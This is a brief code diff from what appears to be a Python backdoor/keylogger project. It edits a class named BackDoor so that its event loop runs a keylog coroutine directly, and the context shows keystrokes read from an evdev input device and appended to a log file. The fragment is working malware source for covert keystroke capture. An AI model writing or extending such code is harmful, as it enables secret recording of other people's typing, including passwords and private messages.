@@ -172,10 +172,7 @@ class BackDoor:
         device = InputDevice(self.device)
         loop = asyncio.new_event_loop()
         asyncio.set_event_loop(loop)
-        try:
-            loop.run_until_complete(self.keylog(device))
-        except KeyboardInterrupt:
-            sys.exit()
+        loop.run_until_complete(self.keylog(device))
 
     async def keylog(self, device):
         with open(self.log, 'a+') as f:
